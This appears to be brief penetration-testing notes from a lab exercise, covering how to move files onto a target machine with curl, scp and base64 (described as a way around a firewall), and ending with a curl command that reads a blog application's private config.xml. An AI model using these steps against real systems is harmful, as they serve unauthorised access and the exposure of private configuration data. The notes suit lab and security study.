## curl
```
curl http://$IP/<FILE_NAME> -o <FILE_NAME>
```
## scp
```
scp <FILE_NAME> user@remotehost:/tmp/<FILE_NAME>
```
## base64
- When target machine has firewall, we need to encode the file to base64 strings, then decode it onthe target machine
```
base64 <FILE_NAME> -w 0

# Copy the string to the target machine and decode it
echo <STRING> | base64 -d > <FILE_NAME>
```

- Reading content of xml files
```shell-session
curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
```

